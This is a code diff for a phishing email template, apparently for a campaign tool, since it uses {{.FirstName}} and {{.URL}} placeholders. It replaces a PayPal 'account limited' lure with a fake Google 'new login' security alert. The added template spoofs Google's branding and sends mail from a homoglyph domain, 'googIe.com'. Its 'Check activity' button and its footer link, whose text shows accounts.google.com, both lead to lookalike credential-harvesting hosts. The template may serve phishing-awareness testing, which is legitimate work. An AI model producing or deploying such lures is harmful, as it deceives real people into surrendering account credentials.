@@ -1,23 +1,44 @@
-From: "PayPal Security" <security@xn--pypal-4ve.com>
-To: user@example.com
-Subject: Security Alert: Your account has been limited
+From: "Google Account Security" <no-reply@accounts.googIe.com>
+To: "{{.FirstName}}" <user@example.com>
+Subject: Security alert: New login detected for {{.FirstName}}@gmail.com
 Date: Thu, 26 Feb 2026 09:00:00 +0000
+Message-ID: <GOOGLE-SEC-99218@accounts.googIe.com>
 MIME-Version: 1.0
 Content-Type: text/html; charset="UTF-8"
 
-<div style="background: #fcfcfc; font-family: 'Helvetica Neue', Arial, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eeeeee; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
-  <div style="padding: 40px;">
-    <div style="margin-bottom: 30px;">
-      <img src="{{.URL}}" alt="PayPal" style="width: 40px;">
+<div style="background-color: #f5f5f5; padding: 40px; font-family: Roboto, Arial, sans-serif;">
+  <div style="max-width: 500px; margin: auto; background-color: #ffffff; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+    <div style="padding: 40px; text-align: left;">
+      <div style="margin-bottom: 30px;">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" style="width: 74px;">
+      </div>
+      
+      <h2 style="color: #3c4043; font-size: 24px; margin-top: 0; font-weight: 400;">Security alert</h2>
+      <p style="font-size: 16px; color: #3c4043; line-height: 1.5;">Your Google Account was just signed in to from a new Linux device. You're getting this email to make sure it was you.</p>
+      
+      <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 20px; margin: 25px 0;">
+        <div style="display: flex; align-items: center; margin-bottom: 10px;">
+          <div style="width: 40px; height: 40px; background-color: #f1f3f4; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">
+            <img src="https://www.gstatic.com/images/icons/material/system/2x/devices_black_24dp.png" style="width: 20px;">
+          </div>
+          <div>
+            <p style="margin: 0; font-size: 14px; color: #3c4043;"><b>Linux</b></p>
+            <p style="margin: 0; font-size: 12px; color: #70757a;">Thursday, Feb 26, 2026 • Lagos, Nigeria</p>
+          </div>
+        </div>
+      </div>
+      
+      <p style="font-size: 14px; color: #3c4043;">If this was you, you can safely disregard this email. If this wasn't you, your account may be at risk. Check your activity and secure your account now.</p>
+      
+      <div style="margin-top: 30px;">
+        <a href="https://xn--gogle-meb.com-security-check.io/auth" style="background-color: #1a73e8; color: #ffffff; padding: 10px 24px; text-decoration: none; border-radius: 4px; font-weight: 500; font-size: 14px; display: inline-block;">Check activity</a>
+      </div>
     </div>
-    <h1 style="color: #003087; font-size: 24px; font-weight: 700; margin-bottom: 25px;">Account Status: Limited</h1>
-    <p style="color: #333; font-size: 16px; line-height: 1.6;">We've noticed suspicious activity on your PayPal account. For your protection, we have temporarily limited your account access to prevent unauthorized transactions.</p>
-    <div style="background: #fff9db; border-left: 5px solid #ffcc00; padding: 20px; border-radius: 4px; margin: 30px 0;">
-      <p style="color: #856404; margin: 0; font-weight: bold;">Action Required:</p>
-      <p style="color: #856404; margin: 10px 0 0 0; font-size: 14px;">To restore access and verify your account details, please log in to our secure verification portal below.</p>
-    </div>
-    <div style="text-align: center; margin-top: 35px;">
-      <a href="{{.URL}}" style="background: #0070ba; color: white; padding: 14px 45px; border-radius: 99px; text-decoration: none; font-weight: bold; display: inline-block;">Verify Account Now</a>
+    
+    <div style="padding: 0 40px 40px 40px; color: #70757a; font-size: 12px; line-height: 1.4;">
+      <p>You can also see security activity at<br><a href="https://accounts.googIe.com/" style="color: #1a73e8; text-decoration: none;">https://accounts.google.com/notifications</a></p>
+      <p>You received this email to let you know about important changes to your Google Account and services.</p>
+      <p>&copy; 2026 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</p>
     </div>
   </div>
 </div>
